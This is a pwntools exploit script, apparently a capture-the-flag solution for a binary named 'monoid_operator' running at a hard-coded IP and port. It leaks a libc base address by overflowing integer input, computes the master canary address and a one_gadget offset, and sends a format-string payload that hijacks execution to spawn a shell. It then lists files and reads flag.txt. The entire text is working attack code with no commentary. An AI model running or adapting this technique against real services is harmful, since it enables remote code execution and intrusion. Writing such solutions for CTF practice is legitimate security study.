from pwn import *
context.log_level = 50

HOST="133.242.49.239"
PORT=27182
conn = None


if len(sys.argv) > 1:
    conn = remote(HOST,PORT)
else:
    conn = process('./files/monoid_operator')
conn.recvuntil("What operator do you choose?\n")
conn.send('+')
conn.recvuntil("How many integers do you input?\n")
conn.send('1000 ')
conn.recvuntil("Input integers.\n")
conn.send(str(0xffffffffffffffff)+' ')
conn.send(str(1)+' ')
conn.send('a')
conn.recvuntil("What operator do you choose?\n")
conn.send('+')
conn.recvuntil("How many integers do you input?\n")
conn.send('1000 ')
conn.recvuntil("Input integers.\n")
conn.send('0 ')
conn.send('a')
tmp=conn.recvuntil("What operator do you choose?\n").split()
libc_base=int(tmp[3][:-1])-1985696
master_canary = libc_base+0x1ec568+1
one_gadged=libc_base+0xe2383
#print("libc_base:",hex(libc_base))
#print("master_canary:",hex(master_canary))
conn.send('q')

conn.recv()
conn.send(p64(master_canary)[:-1])
conn.recv()
#raw_input("Debug?")
conn.send("%1032d%8$c%13$7s"+p64(one_gadged))
conn.send("ls\n")
conn.recv()
conn.send("cat /home/monoid/flag.txt\n")
FLAG=conn.recv()
print (FLAG[:-1])
conn.send("exit\n")
